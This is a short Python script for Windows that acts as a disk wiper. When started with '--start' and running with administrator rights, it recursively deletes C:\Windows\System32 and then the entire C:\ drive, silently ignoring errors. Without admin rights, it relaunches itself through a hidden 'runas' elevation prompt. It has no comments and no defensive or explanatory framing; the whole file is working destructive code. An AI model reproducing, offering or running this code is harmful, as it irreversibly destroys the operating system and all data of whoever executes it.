import os
import sys
import ctypes
import shutil

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def force_wipe(path):
    try:
        shutil.rmtree(path, ignore_errors=True)
        if os.path.exists(path):
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                try:
                    if os.path.isfile(item_path) or os.path.islink(item_path):
                        os.unlink(item_path)
                    elif os.path.isdir(item_path):
                        shutil.rmtree(item_path, ignore_errors=True)
                except:
                    pass
    except:
        pass

def main():
    if "--start" in sys.argv:
        if is_admin():
            force_wipe("C:\\Windows\\System32")
            force_wipe("C:\\")
        else:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 0
            )

if __name__ == "__main__":
    main()
